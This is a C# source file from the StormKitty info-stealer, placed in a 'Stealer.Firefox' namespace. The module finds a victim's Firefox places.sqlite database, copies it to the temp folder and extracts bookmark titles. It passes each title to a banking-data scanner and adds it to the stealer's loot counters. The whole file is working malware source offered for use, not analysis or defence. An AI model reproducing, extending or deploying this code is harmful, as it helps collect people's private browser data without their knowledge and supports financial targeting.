/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using System.Collections.Generic;

namespace Stealer.Firefox
{
    internal class cBookmarks
    {

        // Get cookies.sqlite file location
        private static string GetBookmarksDBPath(string path)
        {
            try
            {
                string dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (string sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\places.sqlite"))
                            return sDir + "\\places.sqlite";
            }
            catch { }
            return null;
        }

        // Get bookmarks from gecko browser
        public static List<Bookmark> Get(string path)
        {
            List<Bookmark> scBookmark = new List<Bookmark>();
            try
            {
                string sCookiePath = GetBookmarksDBPath(path);

                if (!File.Exists(sCookiePath))
                    return scBookmark;

                string sNewPath = Path.GetTempPath() + "\\places.raw";

                if (File.Exists(sNewPath))
                    File.Delete(sNewPath);

                File.Copy(sCookiePath, sNewPath);
                SQLite sSQLite = new SQLite(sNewPath);
                sSQLite.ReadTable("moz_bookmarks");

                if (sSQLite.GetRowCount() == 65536)
                    return new List<Bookmark>();

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Bookmark bBookmark = new Bookmark();
                    bBookmark.sTitle = Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 5));

                    if (Chromium.Crypto.GetUTF8(sSQLite.GetValue(i, 1)).Equals("0") && bBookmark.sTitle != "0")
                    {
                        // Analyze value
                        Banking.ScanData(bBookmark.sTitle);
                        Counter.Bookmarks++;
                        scBookmark.Add(bBookmark);
                    }
                }

                return scBookmark;
            }
            catch (Exception ex) { Console.WriteLine(ex); }
            return new List<Bookmark>();
        }

    }
}
